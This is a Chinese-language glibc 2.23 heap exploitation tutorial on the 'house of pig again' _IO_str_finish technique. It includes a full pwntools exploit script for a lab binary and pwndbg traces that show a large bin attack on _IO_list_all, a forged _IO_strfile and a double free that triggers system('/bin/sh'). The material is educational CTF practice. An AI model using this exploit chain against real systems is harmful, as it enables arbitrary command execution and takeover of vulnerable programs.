本章节作为对前述house of pig利用技术的延伸与补充，将系统剖析`_IO_str_finish`函数中存在的独立利用路径。该路径的核心在于一次直接的函数指针调用：`(((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);`。

与`_IO_str_overflow`函数中依赖缓冲区空间计算、进而触发`_allocate_buffer`或次级`_free_buffer`的利用方式不同，`_IO_str_finish`的利用机制更为简洁直接。在利用构造上，通过劫持`_IO_list_all`全局链表中的`_IO_FILE`结构，将其虚表（vtable）中的`_IO_OVERFLOW`函数指针篡改为`_IO_str_finish`函数的地址。当`_IO_flush_all_lockp`遍历`_IO_list_all`链表时，便会调用此恶意流上被篡改的`_IO_OVERFLOW`指针，从而执行`_IO_str_finish`。

`_IO_str_finish`函数会无条件地调用流对象中`_s._free_buffer`成员所指向的函数，并以`fp->_IO_buf_base`作为参数传递。因此，只要能够触发对此函数的调用，并完全控制伪造结构中的`_free_buffer`指针和`_IO_buf_base`字段，即可实现一次参数可控的任意函数调用。典型利用方式是将`_free_buffer`设置为`system`函数的地址，同时将`_IO_buf_base`设置为命令字符串（如`"/bin/sh"`）的地址，从而执行`system("/bin/sh")`。

此路径为控制流劫持提供了另一种简洁有效的方案。相较于`_IO_str_overflow`，`_IO_str_finish`路径不依赖于复杂的缓冲区状态计算，仅需控制函数指针和一个数据指针，在部分利用场景中构造更为简便、约束更少。因此，当`_IO_str_overflow`的触发条件（如`_IO_buf_end`与`_IO_buf_base`的差值控制）难以满足时，`_IO_str_finish`这条路径可作为一种更直接、可靠的备选方案，从而增强了整个利用链在面对不同环境时的鲁棒性和成功适应性。


测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_pig_again/exploit.py)。

核心利用代码如下：

```python
# house of pig again
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
_IO_str_jumps = libc.sym["_IO_str_jumps"]
log.info(f"_IO_str_jumps addr: {hex(_IO_str_jumps)}")
_IO_list_all = libc.sym["_IO_list_all"]
log.info(f"_IO_list_all addr: {hex(_IO_list_all)}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_IO_list_all - 0x10)
payload += p64(chunk0_addr) + p64(_IO_list_all - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)
#   319   if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
# ► 320     (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
fake_io = b"\x00" * (0x20 - 0x10) + p64(0)
fake_io = fake_io.ljust(0x28 - 0x10, b"\x00") + p64(1)
fake_io = fake_io.ljust(0x38 - 0x10, b"\x00") + p64(binsh_addr)
fake_io = fake_io.ljust(0xC0 - 0x10, b"\x00") + p64(0)
fake_io = fake_io.ljust(0xD8 - 0x10, b"\x00") + p64(_IO_str_jumps - 0x8)
fake_io += p64(0)
fake_io += p64(system)
edit(2, len(fake_io), fake_io)
delete(0)
conn.recvline()
cmd = b"cat src/2.23/house_of_pig_again/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在漏洞利用链的构造中，首要且关键的一步是借助large Bin Attack原语实现一次精确的任意地址写。通过操纵large Bin中chunk的bk_nextsize等元数据指针，利用该机制在链表重整过程中的逻辑缺陷，最终将全局符号`_IO_list_all`的值覆写为一个已知且完全可控的堆内存地址，即`chunks[2]`。控制`_IO_list_all`具有十分重要意义，因为它是glibc中管理所有活跃`_IO_FILE`结构链表的头指针。篡改此指针意味能够将恶意构造的伪造文件流对象植入系统维护的全局链表，为后续劫持控制流奠定基础。

在成功将`_IO_list_all`指向可控堆区域`chunks[2]`后，随即在该地址处精心布局一个伪造的`_IO_strfile`结构体。此结构是`_IO_FILE`的派生类型，用于字符串I/O，其精心设置的各个字段共同构建了一个逻辑陷阱：

1.  `_mode`字段：设置为0。此举旨在通过`_IO_flush_all_lockp`函数内部的`fp->_mode <= 0`条件检查，确保执行流能进入调用`_IO_OVERFLOW`的代码路径。
2.  `_IO_write_base`与`_IO_write_ptr`字段：将`_IO_write_base`设为0，`_IO_write_ptr`设为大于0的值（如1）。目的是满足`fp->_IO_write_ptr > fp->_IO_write_base`的校验条件，该条件在`_IO_flush_all_lockp`遍历链表时，用于判断是否需要对该流执行刷新操作，从而触发对`_IO_OVERFLOW`虚函数的调用。
3.  虚表（`vtable`）指针：将其设置为glibc中合法的`_IO_str_jumps`地址。这能有效绕过高版本glibc引入的`IO_validate_vtable`安全检查，使该伪造流在库函数看来具备一个合法的操作跳转表。
4.  `_IO_buf_base`字段：此字段被设置为目标参数（例如字符串`"/bin/sh"`的地址）。它需要满足双重作用：首先，其值非空，以通过`if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))`的校验；其次，它将作为关键参数传递给后续的恶意函数调用。
5.  `_s._free_buffer`函数指针：此指针被设置为目标函数地址（例如`system`函数的地址）。它是整个利用的最终执行点。

```bash
pwndbg> p/x *(_IO_strfile*)_IO_list_all
$1 = {
  _sbf = {
    _f = {
      _flags = 0x0,
      _IO_read_ptr = 0x411,
      _IO_read_end = 0x0,
      _IO_read_base = 0x0,
      _IO_write_base = 0x0,
      _IO_write_ptr = 0x1,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x7a7bc5356d73,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _markers = 0x0,
      _chain = 0x0,
      _fileno = 0x0,
      _flags2 = 0x0,
      _old_offset = 0x0,
      _cur_column = 0x0,
      _vtable_offset = 0x0,
      _shortbuf = {0x0},
      _lock = 0x0,
      _offset = 0x0,
      _codecvt = 0x0,
      _wide_data = 0x0,
      _freeres_list = 0x0,
      _freeres_buf = 0x0,
      __pad5 = 0x0,
      _mode = 0x0,
      _unused2 = {0x0 <repeats 20 times>}
    },
    vtable = 0x7a7bc558c798
  },
  _s = {
    _allocate_buffer = 0x0,
    _free_buffer = 0x7a7bc523c3eb
  }
}
pwndbg> x/s 0x7a7bc5356d73
0x7a7bc5356d73: "/bin/sh"
pwndbg> x/5i 0x7a7bc523c3eb
   0x7a7bc523c3eb <__libc_system>:      sub    rsp,0x8
   0x7a7bc523c3ef <__libc_system+4>:    test   rdi,rdi
   0x7a7bc523c3f2 <__libc_system+7>:    jne    0x7a7bc523c40a <__libc_system+31>
   0x7a7bc523c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x7a7bc5356d7b
   0x7a7bc523c3fb <__libc_system+16>:   call   0x7a7bc523be36 <do_system>
pwndbg> largebins 
largebins
0x400-0x430 [corrupted]
FD: 0x593b08039000 —▸ 0x593b08039940 ◂— 0
BK: 0x593b08039940 ◂— 0
pwndbg> p/x chunks[0]
$2 = {
  size = 0x20,
  addr = 0x593b08039010
}
pwndbg> 
```

在完成对伪造`_IO_strfile`结构的布局后，利用流程进入关键的触发执行阶段。此时，通过前期操作使堆块`chunks[0]`处于已被释放的状态（即其对应的inuse位已被清零）。此时，若再次对`chunks[0]`发起释放操作（即再次调用`free(chunks[0])`），此操作将被glibc堆管理器（具体在_int_free函数中）检测为双重释放（Double-Free）。

堆管理器会检查该chunk的元数据状态，确认其已处于释放状态，从而触发内部的错误检测逻辑。该错误被判定为一种严重的内存管理错误，导致程序流程转入`malloc_printerr`函数，以输出相应的错误信息并通常会导致程序中止。

然而，在预设的利用路径中，`malloc_printerr`函数的行为被恶意利用。其内部逻辑在处理此类严重错误时，并非立即终止进程，而是会尝试刷新所有输出流以确保错误信息能够被写出。为此，它会调用`_IO_flush_all_lockp`函数。这个函数的设计目的是遍历由全局指针`_IO_list_all`所管理的整个`_IO_FILE`结构链表，并尝试刷新（即执行输出操作）其中每一个需要刷新的文件流。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
 ► 0x7a7bc526de45 <_IO_flush_all_lockp+413>    call   qword ptr [rax + 0x18]      <_IO_str_finish>
        rdi: 0x593b08039940 ◂— 0
        rsi: 0xffffffff
```

在成功将`_IO_list_all`指针劫持并布置好伪造的`_IO_strfile`结构后，程序执行流进入关键的触发阶段。当错误处理函数`_IO_flush_all_lockp`遍历链表并检查到该伪造结构时，它会首先进行条件校验：`if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))`。

此前已预先将结构中的`_mode`字段设为0，`_IO_write_base`设为0，`_IO_write_ptr`设为1。因此，`fp->_mode (0) <= 0`条件成立，且`fp->_IO_write_ptr (1) > fp->_IO_write_base (0) `条件亦成立，校验顺利通过。这标志着该伪造流被识别为一个“需要被刷新”的有效输出流。

校验通过后，程序将通过该流的虚表（vtable）调用其`_IO_OVERFLOW`函数指针。在此前的布局中，已将该流的虚表指针设置为glibc中合法的`_IO_str_jumps`地址，并进一步将该虚表中的`_IO_OVERFLOW`条目（通常是`_IO_str_overflow`）篡改为`_IO_str_finish`函数的地址。这一篡改是至关重要的一步，它将原本用于处理缓冲区溢出的正常函数调用，转向了一个用于清理资源的终结函数。

因此，当程序调用`_IO_OVERFLOW`时，实际执行的是`_IO_str_finish`。这一跳转意味着成功地将控制流从常规的IO处理路径，导向了一个参数和函数指针均可被完全控制的危险函数，为最终执行任意命令（如`system("/bin/sh")`）打开了大门。整个利用链的核心在此衔接，一次本应输出错误信息的内部操作，被转化为一个完全掌控的函数调用。

```bash
In file: /home/bogon/workSpaces/glibc/libio/strops.c:320
   314 libc_hidden_def (_IO_str_pbackfail)
   315 
   316 void
   317 _IO_str_finish (_IO_FILE *fp, int dummy)
   318 {
   319   if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
 ► 320     (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
 
pwndbg> p/x ((_IO_strfile *) fp)->_s._free_buffer
$3 = 0x7a7bc523c3eb
pwndbg> x/5i 0x7a7bc523c3eb
   0x7a7bc523c3eb <__libc_system>:      sub    rsp,0x8
   0x7a7bc523c3ef <__libc_system+4>:    test   rdi,rdi
   0x7a7bc523c3f2 <__libc_system+7>:    jne    0x7a7bc523c40a <__libc_system+31>
   0x7a7bc523c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x7a7bc5356d7b
   0x7a7bc523c3fb <__libc_system+16>:   call   0x7a7bc523be36 <do_system>
pwndbg> p/x fp->_IO_buf_base
$4 = 0x7a7bc5356d73
pwndbg> x/s 0x7a7bc5356d73
0x7a7bc5356d73: "/bin/sh"
pwndbg> 
```

当控制流成功跳转至被篡改的`_IO_str_finish`函数，并执行到关键代码`(((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);`时，整个利用链达到最终目标。在此前的精心布局下，该行代码的两个核心组件已被完全控制：

1.  函数指针：`((_IO_strfile *) fp)->_s._free_buffer`已被设置为`system`函数的地址。
2.  调用参数：`fp->_IO_buf_base`已被设置为字符串`"/bin/sh"`的地址。

因此，该语句的执行效果在逻辑上完全等价于直接调用`system("/bin/sh")`。这意味着程序的控制流被从正常的库函数路径，最终重定向到了操作系统的命令执行接口。调用成功后，将启动一个新的sh进程。这标志着从初始的堆内存破坏，到利用IO流结构体进行的复杂控制流劫持，最终达成了稳定的任意命令执行，整个高难度漏洞利用链圆满完成。


### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
